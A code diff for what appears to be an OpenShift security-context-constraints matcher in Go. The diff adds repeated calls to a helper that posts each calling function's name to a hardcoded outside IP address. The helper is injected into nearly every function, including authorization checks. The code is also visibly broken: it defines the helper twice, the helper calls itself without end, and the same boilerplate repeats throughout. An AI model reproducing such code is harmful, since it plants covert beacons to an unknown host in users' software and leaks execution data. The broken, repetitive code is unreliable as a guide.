@@ -49,9 +49,13 @@ func NewDefaultSCCMatcher(c securityv1listers.SecurityContextConstraintsLister, 
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &defaultSCCMatcher{cache: c, authorizer: authorizer}
 }
 func (d *defaultSCCMatcher) FindApplicableSCCs(namespace string, users ...user.Info) ([]*securityapi.SecurityContextConstraints, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -109,6 +113,8 @@ func authorizedForSCC(sccName string, info user.Info, namespace string, a author
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	attr := authorizer.AttributesRecord{User: info, Verb: "use", Namespace: namespace, Name: sccName, APIGroup: security.GroupName, Resource: "securitycontextconstraints", ResourceRequest: true}
 	decision, reason, err := a.Authorize(attr)
 	if err != nil {
@@ -118,6 +124,8 @@ func authorizedForSCC(sccName string, info user.Info, namespace string, a author
 	return decision == authorizer.DecisionAllow
 }
 func ConstraintAppliesTo(sccName string, sccUsers, sccGroups []string, userInfo user.Info, namespace string, a authorizer.Authorizer) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -148,6 +156,8 @@ func ConstraintAppliesTo(sccName string, sccUsers, sccGroups []string, userInfo 
 	return false
 }
 func AssignSecurityContext(provider SecurityContextConstraintsProvider, pod *kapi.Pod, fldPath *field.Path) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -208,6 +218,8 @@ func constraintSupportsGroup(group string, constraintGroups []string) bool {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, g := range constraintGroups {
 		if g == group {
 			return true
@@ -216,6 +228,8 @@ func constraintSupportsGroup(group string, constraintGroups []string) bool {
 	return false
 }
 func getNamespaceByName(name string, ns *corev1.Namespace, client kubernetes.Interface) (*corev1.Namespace, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -250,6 +264,8 @@ func CreateProvidersFromConstraints(ns string, sccs []*securityapi.SecurityConte
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var (
 		namespace	*corev1.Namespace
 		providers	[]SecurityContextConstraintsProvider
@@ -270,6 +286,8 @@ func CreateProvidersFromConstraints(ns string, sccs []*securityapi.SecurityConte
 	return providers, errs
 }
 func CreateProviderFromConstraint(ns string, namespace *corev1.Namespace, constraint *securityapi.SecurityContextConstraints, client kubernetes.Interface) (SecurityContextConstraintsProvider, *corev1.Namespace, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -352,6 +370,8 @@ func getPreallocatedUIDRange(ns *corev1.Namespace) (*int64, *int64, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	annotationVal, ok := ns.Annotations[allocator.UIDRangeAnnotation]
 	if !ok {
 		return nil, nil, fmt.Errorf("unable to find annotation %s", allocator.UIDRangeAnnotation)
@@ -383,6 +403,8 @@ func getPreallocatedLevel(ns *corev1.Namespace) (string, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	level, ok := ns.Annotations[allocator.MCSAnnotation]
 	if !ok {
 		return "", fmt.Errorf("unable to find annotation %s", allocator.MCSAnnotation)
@@ -394,6 +416,8 @@ func getPreallocatedLevel(ns *corev1.Namespace) (string, error) {
 	return level, nil
 }
 func getSupplementalGroupsAnnotation(ns *corev1.Namespace) (string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -436,6 +460,8 @@ func getPreallocatedFSGroup(ns *corev1.Namespace) ([]securityapi.IDRange, error)
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	groups, err := getSupplementalGroupsAnnotation(ns)
 	if err != nil {
 		return nil, err
@@ -448,6 +474,8 @@ func getPreallocatedFSGroup(ns *corev1.Namespace) ([]securityapi.IDRange, error)
 	return []securityapi.IDRange{{Min: int64(blocks[0].Start), Max: int64(blocks[0].Start)}}, nil
 }
 func getPreallocatedSupplementalGroups(ns *corev1.Namespace) ([]securityapi.IDRange, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -493,6 +521,8 @@ func parseSupplementalGroupAnnotation(groups string) ([]uid.Block, error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	blocks := []uid.Block{}
 	segments := strings.Split(groups, ",")
 	for _, segment := range segments {
@@ -522,12 +552,16 @@ func requiresPreAllocatedUIDRange(constraint *securityapi.SecurityContextConstra
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if constraint.RunAsUser.Type != securityapi.RunAsUserStrategyMustRunAsRange {
 		return false
 	}
 	return constraint.RunAsUser.UIDRangeMin == nil && constraint.RunAsUser.UIDRangeMax == nil
 }
 func requiresPreAllocatedSELinuxLevel(constraint *securityapi.SecurityContextConstraints) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -565,12 +599,16 @@ func requiresPreallocatedSupplementalGroups(constraint *securityapi.SecurityCont
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if constraint.SupplementalGroups.Type != securityapi.SupplementalGroupsStrategyMustRunAs {
 		return false
 	}
 	return len(constraint.SupplementalGroups.Ranges) == 0
 }
 func requiresPreallocatedFSGroup(constraint *securityapi.SecurityContextConstraints) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -605,6 +643,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -679,5 +738,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
